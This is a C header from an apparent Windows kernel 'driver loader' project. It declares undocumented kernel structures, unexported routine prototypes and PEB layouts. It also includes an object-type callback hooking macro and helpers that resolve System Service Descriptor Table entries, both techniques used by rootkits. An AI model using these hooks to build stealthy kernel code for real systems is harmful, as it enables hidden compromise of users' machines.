//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: ntddkex.h
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description: 
//  Constants, macros, structures and functions not included in ntddk.h

#pragma once

#ifndef BOOL
 #define BOOL ULONG
#endif


#define	BYTE	UCHAR
#define	WORD	USHORT
#define	DWORD	ULONG


// timer period macros
#define _RELATIVE(x)		-(x)
#define _SECONDS(x)			(LONGLONG)x*10000000
#define _MILLISECONDS(x)	(LONGLONG)x*10000
#define _MINUTES(x)			(LONGLONG)x*600000000


#define DLL_PROCESS_ATTACH   1    
#define DLL_THREAD_ATTACH    2    
#define DLL_THREAD_DETACH    3    
#define DLL_PROCESS_DETACH   0    
#define DLL_PROCESS_VERIFIER 4   


#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_OS2_SIGNATURE                 0x454E      // NE
#define IMAGE_OS2_SIGNATURE_LE              0x454C      // LE
#define IMAGE_VXD_SIGNATURE                 0x454C      // LE
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00



#define	wczSystemRoot						L"\\SystemRoot\\"


#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  // Relocation info stripped from file.
#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  // File is executable  (i.e. no unresolved externel references).
#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  // Line nunbers stripped from file.
#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  // Local symbols stripped from file.
#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  // Agressively trim working set
#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  // App can handle >2gb addresses
#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  // Bytes of machine word are reversed.
#define IMAGE_FILE_32BIT_MACHINE             0x0100  // 32 bit word machine.
#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  // Debugging info stripped from file in .DBG file
#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  // If Image is on removable media, copy and run from the swap file.
#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  // If Image is on Net, copy and run from the swap file.
#define IMAGE_FILE_SYSTEM                    0x1000  // System File.
#define IMAGE_FILE_DLL                       0x2000  // File is a DLL.
#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  // File should only be run on a UP machine
#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  // Bytes of machine word are reversed.

#define IMAGE_FILE_MACHINE_UNKNOWN           0
#define IMAGE_FILE_MACHINE_I386              0x014c  // Intel 386.
#define IMAGE_FILE_MACHINE_R3000             0x0162  // MIPS little-endian, 0x160 big-endian
#define IMAGE_FILE_MACHINE_R4000             0x0166  // MIPS little-endian
#define IMAGE_FILE_MACHINE_R10000            0x0168  // MIPS little-endian
#define IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  // MIPS little-endian WCE v2
#define IMAGE_FILE_MACHINE_ALPHA             0x0184  // Alpha_AXP
#define IMAGE_FILE_MACHINE_SH3               0x01a2  // SH3 little-endian
#define IMAGE_FILE_MACHINE_SH3DSP            0x01a3
#define IMAGE_FILE_MACHINE_SH3E              0x01a4  // SH3E little-endian
#define IMAGE_FILE_MACHINE_SH4               0x01a6  // SH4 little-endian
#define IMAGE_FILE_MACHINE_SH5               0x01a8  // SH5
#define IMAGE_FILE_MACHINE_ARM               0x01c0  // ARM Little-Endian
#define IMAGE_FILE_MACHINE_THUMB             0x01c2
#define IMAGE_FILE_MACHINE_AM33              0x01d3
#define IMAGE_FILE_MACHINE_POWERPC           0x01F0  // IBM PowerPC Little-Endian
#define IMAGE_FILE_MACHINE_POWERPCFP         0x01f1
#define IMAGE_FILE_MACHINE_IA64              0x0200  // Intel 64
#define IMAGE_FILE_MACHINE_MIPS16            0x0266  // MIPS
#define IMAGE_FILE_MACHINE_ALPHA64           0x0284  // ALPHA64
#define IMAGE_FILE_MACHINE_MIPSFPU           0x0366  // MIPS
#define IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  // MIPS
#define IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64
#define IMAGE_FILE_MACHINE_TRICORE           0x0520  // Infineon
#define IMAGE_FILE_MACHINE_CEF               0x0CEF
#define IMAGE_FILE_MACHINE_EBC               0x0EBC  // EFI Byte Code
#define IMAGE_FILE_MACHINE_AMD64             0x8664  // AMD64 (K8)
#define IMAGE_FILE_MACHINE_M32R              0x9041  // M32R little-endian
#define IMAGE_FILE_MACHINE_CEE               0xC0EE



// Kernel APC environment constants
typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;



#define SEC_FILE			0x800000     
#define SEC_IMAGE			0x1000000     
#define SEC_RESERVE			0x4000000     
#define SEC_COMMIT			0x8000000     
#define SEC_NOCACHE			0x10000000     
#define SEC_LARGE_PAGES		0x80000000     


typedef union _GUID_EX
{
	GUID	Guid;
	struct
	{
		ULONG	Part0;
		ULONG	Part1;
		ULONG	Part2;
		ULONG	Part3;
	};
} GUID_EX, *PGUID_EX;


// ---- System information -----------------------------------------------------------------------------------------------

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemNotImplemented1,
    SystemProcessesAndThreadsInformation,
    SystemCallCounts,
    SystemConfigurationInformation,
    SystemProcessorPerformanceInformation,
    SystemGlobalFlag,
    SystemNotImplemented2,						// 10
    SystemModuleInformation,
    SystemLockInformation,
    SystemNotImplemented3,
    SystemNotImplemented4,
    SystemNotImplemented5,
    SystemHandleInformation,
    SystemObjectInformation,
    SystemPagefileInformation,
    SystemInstructionEmulationCounts,
    SystemInvalidInfoClass1,					// 20
    SystemCacheInformation,
    SystemPoolTagInformation,
    SystemInterruptInformation,
    SystemDpcInformation,
    SystemNotImplemented6,
    SystemLoadImage,
    SystemUnloadImage,
    SystemTimeAdjustment,
    SystemNotImplemented7,
    SystemNotImplemented8,						// 30
    SystemNotImplemented9,
    SystemCrashDumpInformation,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemKernelDebuggerInformation,
    SystemContextSwitchInformation,
    SystemRegistryQuotaInformation,
    SystemExtendServiceTableInformation,
    SystemPrioritySeparation,
    SystemNotImplemented10,						// 40
    SystemNotImplemented11,
    SystemProcessorIdleInformation,
    SystemInvalidInfoClass3,
    SystemTimeZoneInformation,
    SystemLookasideInformation,
    SystemSetTimeSlipEvent,
    SystemCreateSession,
    SystemDeleteSession,
    SystemInvalidInfoClass4,
    SystemRangeStartInformation,				// 50
    SystemVerifierInformation,
    SystemAddVerifier,
    SystemSessionProcessesInformation,
	SystemLoadImageInSystemSpace,
	SystemNumaProcessorMap,					
    SystemPrefetcherInformation,
    SystemExtendedProcessInformation,
    SystemRecommendedSharedDataAlignment,
    SystemComPlusPackage,
    SystemNumaAvailableMemory,					// 60
    SystemProcessorPowerInformation,
    SystemEmulationBasicInformation,
    SystemEmulationProcessorInformation,
    SystemExtendedHandleInformation,
    SystemLostDelayedWriteInformation,
    SystemBigPoolInformation,
    SystemSessionPoolTagInformation,
    SystemSessionMappedViewInformation,
    SystemHotpatchInformation,
    SystemObjectSecurityMode,					// 70
    SystemWatchdogTimerHandler,
    SystemWatchdogTimerInformation,
    SystemLogicalProcessorInformation,

	//w2k8
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,		
	SystemSuperfetchInformation,
	SystemMemoryListInformation,				// 80
	SystemFileCacheInformationEx,
    SystemNotImplemented19,
    SystemProcessorDebugInformation,
    SystemVerifierInformation2,
    SystemNotImplemented20,
    SystemRefTraceInformation,
    SystemSpecialPoolTag, 
    SystemProcessImageName,
    SystemNotImplemented21,
    SystemBootEnvironmentInformation,			// 90
    SystemEnlightenmentInformation,
    SystemVerifierInformationEx,
	SystemSetTimeZoneInformation,
    SystemNotImplemented23,
    SystemCovInformation,
	SystemNotImplemented24,
    SystemNotImplemented25,
    SystemPartitionInformation,
    SystemSystemDiskInformation,
    SystemPerformanceDistributionInformation,	// 100
    SystemNumaProximityNodeInformation,
    SystemDynamicTimeZoneInformation,
    SystemCodeIntegrityInformation,
    SystemNotImplemented26,
    SystemUnknownInformation,
    SystemVaInformation,
	SystemLogicalProcessorAndGroupInformation,
	SystemLogicalGroupInformation,
	SystemStoreInformation,						// 109

	SystemVhdBootInformation = 112,
	SystemCpuQuotaInformation, 
	
	SystemHardwareCountersInformation = 115,	// Removed in build 7100, uses KeQueryHardwareCounterConfiguration() instead
	SystemLowPriorityInformation,
	SystemTpmBootEntropyInformation,
	SystemVerifierInformation3, 

	// NtQueryEx
	SystemNumaNodesInformation = 121,
	SystemHalInformation,						// 8 bytes size
	SystemCommittedMemoryInformation,
	MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS;

#define	MAX_SYSTEM_MODULE_NAME_LENGTH	256		// bytes

typedef struct _SYSTEM_TIME_OF_DAY_INFORMATION
{
	LARGE_INTEGER	BootTime;
	LARGE_INTEGER	CurrentTime;
	LARGE_INTEGER	TimeZoneBias;
	ULONG			CurrentTimeZoneId;
	ULONG			dwReserved;
} SYSTEM_TIME_OF_DAY_INFORMATION, *PSYSTEM_TIME_OF_DAY_INFORMATION;

typedef struct _SYSTEM_MODULE
{
    ULONG_PTR	Reserved[2];
    ULONG_PTR	Base;
    ULONG		Size;
    ULONG		Flags;
    USHORT		Index;
    USHORT		Unknown;
    USHORT		LoadCount;
    USHORT		ModuleNameOffset;
    CHAR		ImageName[MAX_SYSTEM_MODULE_NAME_LENGTH];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG			uCount;
	SYSTEM_MODULE	aSM[];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;


__declspec(dllimport) 
NTSTATUS _stdcall ZwQuerySystemInformation(
  __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
  __inout    PVOID SystemInformation,
  __in       ULONG SystemInformationLength,
  __out_opt  PULONG ReturnLength
);



__declspec(dllimport) 
NTSTATUS _stdcall ZwOpenProcess(
  __out     PHANDLE ProcessHandle,
  __in      ACCESS_MASK DesiredAccess,
  __in      POBJECT_ATTRIBUTES ObjectAttributes,
  __in_opt  PCLIENT_ID ClientId
);

__declspec(dllimport)
NTSTATUS _stdcall ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

__declspec(dllimport)
NTSTATUS _stdcall ZwAllocateVirtualMemory(
  __in     HANDLE ProcessHandle,
  __inout  PVOID *BaseAddress,
  __in     ULONG_PTR ZeroBits,
  __inout  PSIZE_T RegionSize,
  __in     ULONG AllocationType,
  __in     ULONG Protect
);


__declspec(dllimport)
// Not exported by nt kernel
NTSTATUS _stdcall ZwProtectVirtualMemory(
  __in		HANDLE ProcessHandle, 
  __inout	PVOID *BaseAddress, 
  __inout	PULONG NumberOfBytesToProtect, 
  __in		ULONG NewAccessProtection, 
  __out		PULONG OldAccessProtection 
); 

__declspec(dllimport)
VOID _stdcall KeInitializeApc (
    __out PRKAPC Apc,
    __in PRKTHREAD Thread,
    __in KAPC_ENVIRONMENT Environment,
    __in PKKERNEL_ROUTINE KernelRoutine,
    __in_opt PKRUNDOWN_ROUTINE RundownRoutine,
    __in_opt PKNORMAL_ROUTINE NormalRoutine,
    __in_opt KPROCESSOR_MODE ProcessorMode,
    __in_opt PVOID NormalContext
);

__declspec(dllimport)
BOOLEAN	_stdcall KeInsertQueueApc (
    __inout PRKAPC Apc,
    __in_opt PVOID SystemArgument1,
    __in_opt PVOID SystemArgument2,
    __in KPRIORITY Increment
);

__declspec(dllimport)
NTSTATUS _stdcall LdrRelocateImage (
	__in PVOID	NewBase, 
	__in PUCHAR LoaderName, 
	__in NTSTATUS Success, 
	__in NTSTATUS Conflict, 
	__in NTSTATUS Invalid
);



__declspec(dllimport)
PEPROCESS IoThreadToProcess(
  __in  PETHREAD Thread
);


__declspec(dllimport)
NTSTATUS ZwSetSecurityObject(
  __in  HANDLE Handle,
  __in  SECURITY_INFORMATION SecurityInformation,
  __in  PSECURITY_DESCRIPTOR SecurityDescriptor
);


__declspec(dllimport)
NTSTATUS NtSetSecurityObject(
  __in  HANDLE Handle,
  __in  SECURITY_INFORMATION SecurityInformation,
  __in  PSECURITY_DESCRIPTOR SecurityDescriptor
);


__declspec(dllimport)
NTSTATUS ZwDeleteFile(
  __in  POBJECT_ATTRIBUTES ObjectAttributes
);




// ---- File and direcory information -------------------------------------------------------------------------------------------



__declspec(dllimport)
NTSTATUS ZwQueryDirectoryFile(
  __in      HANDLE FileHandle,
  __in_opt  HANDLE Event,
  __in_opt  PIO_APC_ROUTINE ApcRoutine,
  __in_opt  PVOID ApcContext,
  __out     PIO_STATUS_BLOCK IoStatusBlock,
  __out     PVOID FileInformation,
  __in      ULONG Length,
  __in      FILE_INFORMATION_CLASS FileInformationClass,
  __in      BOOLEAN ReturnSingleEntry,
  __in_opt  PUNICODE_STRING FileName,
  __in      BOOLEAN RestartScan
);


// ---- User mode specific -----------------------------------------------------------------------------------------------------

typedef struct _STARTUPINFOW {
    DWORD   cb;
    LPWSTR  lpReserved;
    LPWSTR  lpDesktop;
    LPWSTR  lpTitle;
    DWORD   dwX;
    DWORD   dwY;
    DWORD   dwXSize;
    DWORD   dwYSize;
    DWORD   dwXCountChars;
    DWORD   dwYCountChars;
    DWORD   dwFillAttribute;
    DWORD   dwFlags;
    WORD    wShowWindow;
    WORD    cbReserved2;
    PCHAR	lpReserved2;
    HANDLE  hStdInput;
    HANDLE  hStdOutput;
    HANDLE  hStdError;
} STARTUPINFOW, *PSTARTUPINFOW;

typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;


//
// dwCreationFlag values
//

#define DEBUG_PROCESS                     0x00000001
#define DEBUG_ONLY_THIS_PROCESS           0x00000002

#define CREATE_SUSPENDED                  0x00000004

#define DETACHED_PROCESS                  0x00000008

#define CREATE_NEW_CONSOLE                0x00000010

#define NORMAL_PRIORITY_CLASS             0x00000020
#define IDLE_PRIORITY_CLASS               0x00000040
#define HIGH_PRIORITY_CLASS               0x00000080
#define REALTIME_PRIORITY_CLASS           0x00000100

#define CREATE_NEW_PROCESS_GROUP          0x00000200
#define CREATE_UNICODE_ENVIRONMENT        0x00000400

#define CREATE_SEPARATE_WOW_VDM           0x00000800
#define CREATE_SHARED_WOW_VDM             0x00001000
#define CREATE_FORCEDOS                   0x00002000

#define BELOW_NORMAL_PRIORITY_CLASS       0x00004000
#define ABOVE_NORMAL_PRIORITY_CLASS       0x00008000
#define STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000

#define CREATE_BREAKAWAY_FROM_JOB         0x01000000
#define CREATE_PRESERVE_CODE_AUTHZ_LEVEL  0x02000000

#define CREATE_DEFAULT_ERROR_MODE         0x04000000
#define CREATE_NO_WINDOW                  0x08000000

#define PROFILE_USER                      0x10000000
#define PROFILE_KERNEL                    0x20000000
#define PROFILE_SERVER                    0x40000000

#define CREATE_IGNORE_SYSTEM_DEFAULT      0x80000000



// ---- Service descriptor table and other info -----------------------------------------------------------------------------

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;
    PULONG Count;
    ULONG Limit;

#if defined(_IA64_)
    LONG TableBaseGpOffset;
#endif

    PUCHAR Number;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;



__declspec(dllimport)	USHORT	NtBuildNumber;

__declspec(dllimport)
KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;

// ---- Object types and initializers ----------------------------------------------------------------------------------------

typedef	struct _OBJECT_TYPE_CALLBACKS
{
	 PVOID DumpProcedure;
     LONG * OpenProcedure;
     PVOID CloseProcedure;
     PVOID DeleteProcedure;
     LONG * ParseProcedure;
     LONG * SecurityProcedure;
     LONG * QueryNameProcedure;
     UCHAR * OkayToCloseProcedure;
} OBJECT_TYPE_CALLBACKS, *POBJECT_TYPE_CALLBACKS;


typedef struct _OBJECT_TYPE_INITIALIZER5
{
	USHORT	Length;
	UCHAR	UseDefaultObject;
	UCHAR	CaseInsensitive;
	ULONG	InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG	ValidAccessMask;
	UCHAR	SecurityRequired;
	UCHAR	MaintainHandleCount;
	UCHAR	MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG	DefaultPagedPoolCharge;
	ULONG	DefaultNonPagedPoolCharge;
	OBJECT_TYPE_CALLBACKS	Callbacks;
} OBJECT_TYPE_INITIALIZER5, *POBJECT_TYPE_INITIALIZER5;


typedef struct _OBJECT_TYPE_INITIALIZER6
{
     WORD Length;
     UCHAR ObjectTypeFlags;
     ULONG CaseInsensitive: 1;
     ULONG UnnamedObjectsOnly: 1;
     ULONG UseDefaultObject: 1;
     ULONG SecurityRequired: 1;
     ULONG MaintainHandleCount: 1;
     ULONG MaintainTypeList: 1;
     ULONG ObjectTypeCode;
     ULONG InvalidAttributes;
     GENERIC_MAPPING GenericMapping;
     ULONG ValidAccessMask;
     POOL_TYPE PoolType;
     ULONG DefaultPagedPoolCharge;
     ULONG DefaultNonPagedPoolCharge;
	 OBJECT_TYPE_CALLBACKS	Callbacks;
} OBJECT_TYPE_INITIALIZER6, *POBJECT_TYPE_INITIALIZER6;


typedef struct _OBJECT_TYPE_INITIALIZER7
{
     WORD Length;
	 union {
		UCHAR ObjectTypeFlags;
		struct {
			USHORT CaseInsensitive: 1;
			USHORT UnnamedObjectsOnly: 1;
			USHORT UseDefaultObject: 1;
			USHORT SecurityRequired: 1;
			USHORT MaintainHandleCount: 1;
			USHORT MaintainTypeList: 1;
		};
	 };
	 ULONG ObjectTypeCode;
     ULONG InvalidAttributes;
     GENERIC_MAPPING GenericMapping;
     ULONG ValidAccessMask;
	 ULONG RetainAccess;
     POOL_TYPE PoolType;
     ULONG DefaultPagedPoolCharge;
     ULONG DefaultNonPagedPoolCharge;
	 OBJECT_TYPE_CALLBACKS	Callbacks;
} OBJECT_TYPE_INITIALIZER7, *POBJECT_TYPE_INITIALIZER7;


// Windows XP, 2003 object type structure
typedef struct _OBJECT_TYPE5
{
    ERESOURCE Mutex;
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    ULONG Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER5 TypeInfo;
} OBJECT_TYPE5, *POBJECT_TYPE5;

// Windows Vista object type structure
typedef struct _OBJECT_TYPE6
{
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    ULONG Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER6 TypeInfo;
} OBJECT_TYPE6, *POBJECT_TYPE6;

// Windows 7 Object type structure
typedef struct _OBJECT_TYPE7
{
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    UCHAR Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER7 TypeInfo;
} OBJECT_TYPE7, *POBJECT_TYPE7;


// From WRK (OB.H)
typedef enum _OB_OPEN_REASON {
    ObCreateHandle,
    ObOpenHandle,
    ObDuplicateHandle,
    ObInheritHandle,
    ObMaxOpenReason
} OB_OPEN_REASON;


typedef NTSTATUS (__stdcall* OB_OPEN_METHOD)(
    IN OB_OPEN_REASON OpenReason,
    IN PEPROCESS Process OPTIONAL,
    IN PVOID Object,
    IN ACCESS_MASK GrantedAccess,
    IN ULONG HandleCount
    );


#define		PTR_OBJECT_TYPE_CALLBACKS(x)	(NtBuildNumber < 6000 ? &((POBJECT_TYPE5)x)->TypeInfo.Callbacks : \
	(NtBuildNumber < 7600 ? &((POBJECT_TYPE6)x)->TypeInfo.Callbacks : &((POBJECT_TYPE7)x)->TypeInfo.Callbacks))

#define	HookObjectType(pObjectType, Procedure, HookFunction, pOriginal)	\
		*pOriginal = (PTR_OBJECT_TYPE_CALLBACKS(pObjectType))->Procedure##;	\
		*pOriginal = InterlockedExchangePointer(&(PTR_OBJECT_TYPE_CALLBACKS(pObjectType))->Procedure##, HookFunction)

#define	UnhookObjectType(pObjectType, Procedure, Original)	\
		(PTR_OBJECT_TYPE_CALLBACKS(pObjectType))->Procedure## = Original;
		
		


// ---- SDT ---------------------------------------------------------------------------------------------------------------
PULONG	KiServiceTable;

_inline PVOID	ZwPtrFromNtPtr32(PVOID Ptr)
{
    if(*((PUCHAR)Ptr) == 0xB8) 	
        return (PVOID)KeServiceDescriptorTable.Base[*(PULONG)((PUCHAR)(Ptr)+1)];
    return NULL;
}

_inline PVOID	ZwPtrFromNtPtr64(PVOID Ptr)
{
    if(*((PUCHAR)Ptr + 3) == 0xB8) 	
	{
		if (NtBuildNumber < 6000)
			return (PVOID)((PCHAR)KiServiceTable + (KiServiceTable[*(PULONG)((PUCHAR)Ptr + 3 + 1)] & 0xfffffffc));
		else
			return (PVOID)((PCHAR)KiServiceTable + (KiServiceTable[*(PULONG)((PUCHAR)Ptr + 3 + 1)] >> 4));
	}
    return NULL;
}


#ifdef _M_AMD64
	#define		ZwPtrFromNtPtr(x)	ZwPtrFromNtPtr64(x)
#else
	#define		ZwPtrFromNtPtr(x)	ZwPtrFromNtPtr32(x)
#endif

_inline PVOID	GetKernelBaseByPtr(PVOID Ptr)
{
	PCHAR	KernelPtr = (PCHAR)((ULONG_PTR)Ptr & (~0xffff));

	while (*(PUSHORT)KernelPtr != IMAGE_DOS_SIGNATURE)
		KernelPtr -= (PAGE_SIZE * 0x10); 

	return((PVOID)KernelPtr);
}

// ---- PEB and used structures -----------------------------------------------------------------------------------------------
#define  PEB_MAX_DLL_NAME	0x80	// bytes

typedef VOID NTSYSAPI (*PPEBLOCKROUTINE)(PVOID);

typedef struct _PEB_LDR_DATA
{
	ULONG		Length;
	BOOLEAN		Initialized;
	PVOID		SsHandle;
	LIST_ENTRY	InLoadOrderModuleList; // ref. to PLDR_DATA_TABLE_ENTRY->InLoadOrderModuleList
	LIST_ENTRY	InMemoryOrderModuleList; // ref. to PLDR_DATA_TABLE_ENTRY->InMemoryOrderModuleList
	LIST_ENTRY	InInitializationOrderModuleList; // ref. to PLDR_DATA_TABLE_ENTRY->InInitializationOrderModuleList
} PEB_LDR_DATA, *PPEB_LDR_DATA;


typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY		InLoadOrderModuleList;
    LIST_ENTRY		InMemoryOrderModuleList;
    LIST_ENTRY		InInitializationOrderModuleList;
    PVOID			DllBase;
    PVOID			EntryPoint;
    ULONG			SizeOfImage;	// in bytes
    UNICODE_STRING	FullDllName;
    UNICODE_STRING	BaseDllName;
    ULONG			Flags;			// LDR_*
    USHORT			LoadCount;
    USHORT			TlsIndex;
    LIST_ENTRY		HashLinks;
    PVOID			SectionPointer;
    ULONG			CheckSum;
    ULONG			TimeDateStamp;
//    PVOID			LoadedImports;					// seems they are exist only on XP !!!
//    PVOID			EntryPointActivationContext;	// -same-
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


typedef struct _PEB_FREE_BLOCK
{
   struct _PEB_FREE_BLOCK	*Next;
   ULONG					Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct _CURDIR
{
   UNICODE_STRING	DosPath;
   HANDLE			Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD	Flags;
	WORD	Length;
	DWORD	TimeStamp;
	STRING	DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _SYSTEM_STRINGS
{
	UNICODE_STRING	SystemRoot;       // C:\WINNT
	UNICODE_STRING	System32Root;     // C:\WINNT\System32
	UNICODE_STRING	BaseNamedObjects; // \BaseNamedObjects
}SYSTEM_STRINGS,*PSYSTEM_STRINGS;

typedef struct _TEXT_INFO
{
	PVOID			Reserved;
	PSYSTEM_STRINGS	SystemStrings;
}TEXT_INFO, *PTEXT_INFO;


typedef struct _PROCESS_PARAMETERS
{
    ULONG					MaximumLength;
    ULONG					Length;
    ULONG					Flags;				// PROCESS_PARAMETERS_NORMALIZED
    ULONG					DebugFlags;
    HANDLE					ConsoleHandle;
    ULONG					ConsoleFlags;
    HANDLE					StandardInput;
    HANDLE					StandardOutput;
    HANDLE					StandardError;
    CURDIR					CurrentDirectory;
    UNICODE_STRING			DllPath;
    UNICODE_STRING			ImagePathName;
    UNICODE_STRING			CommandLine;
    PWSTR					Environment;
    ULONG					StartingX;
    ULONG					StartingY;
    ULONG					CountX;
    ULONG					CountY;
    ULONG					CountCharsX;
    ULONG					CountCharsY;
    ULONG					FillAttribute;
    ULONG					WindowFlags;
    ULONG					ShowWindowFlags;
    UNICODE_STRING			WindowTitle;
    UNICODE_STRING			Desktop;
    UNICODE_STRING			ShellInfo;
    UNICODE_STRING			RuntimeInfo;
	RTL_DRIVE_LETTER_CURDIR	CurrentDirectores[32];
} PROCESS_PARAMETERS, *PPROCESS_PARAMETERS;

typedef struct _PEB
{
	UCHAR				InheritedAddressSpace;				// 0
	UCHAR				ReadImageFileExecOptions;			// 1
	UCHAR				BeingDebugged;						// 2
	BYTE				b003;								// 3
	PVOID				Mutant;								// 4
	PVOID				ImageBaseAddress;					// 8
	PPEB_LDR_DATA		Ldr;								// C
	PPROCESS_PARAMETERS	ProcessParameters;					// 10
	PVOID				SubSystemData;						// 14  
	PVOID				ProcessHeap;						// 18
	KSPIN_LOCK			FastPebLock;						// 1C
	PPEBLOCKROUTINE		FastPebLockRoutine;					// 20
	PPEBLOCKROUTINE		FastPebUnlockRoutine;				// 24
	ULONG				EnvironmentUpdateCount;				// 28
	PVOID				*KernelCallbackTable;				// 2C
	PVOID				EventLogSection;					// 30
	PVOID				EventLog;							// 34
	PPEB_FREE_BLOCK		FreeList;							// 38
	ULONG				TlsExpansionCounter;				// 3C
	PRTL_BITMAP			TlsBitmap;							// 40
	ULONG				TlsBitmapData[0x2];					// 44
	PVOID				ReadOnlySharedMemoryBase;			// 4C
	PVOID				ReadOnlySharedMemoryHeap;			// 50
	PTEXT_INFO			ReadOnlyStaticServerData;			// 54
	PVOID				InitAnsiCodePageData;				// 58
	PVOID				InitOemCodePageData;				// 5C
	PVOID				InitUnicodeCaseTableData;			// 60
	ULONG				KeNumberProcessors;					// 64
	ULONG				NtGlobalFlag;						// 68
	DWORD				d6C;								// 6C
	LARGE_INTEGER		MmCriticalSectionTimeout;			// 70
	ULONG				MmHeapSegmentReserve;				// 78
	ULONG				MmHeapSegmentCommit;				// 7C
	ULONG				MmHeapDeCommitTotalFreeThreshold;	// 80
	ULONG				MmHeapDeCommitFreeBlockThreshold;	// 84
	ULONG				NumberOfHeaps;						// 88
	ULONG				AvailableHeaps;						// 8C
	PHANDLE				ProcessHeapsListBuffer;				// 90
	PVOID				GdiSharedHandleTable;				// 94
	PVOID				ProcessStarterHelper;				// 98
	PVOID				GdiDCAttributeList;					// 9C
	KSPIN_LOCK			LoaderLock;							// A0
	ULONG				NtMajorVersion;						// A4
	ULONG				NtMinorVersion;						// A8
	USHORT				NtBuildNumber;						// AC
	USHORT				NtCSDVersion;						// AE
	ULONG				PlatformId;							// B0
	ULONG				Subsystem;							// B4
	ULONG				MajorSubsystemVersion;				// B8
	ULONG				MinorSubsystemVersion;				// BC
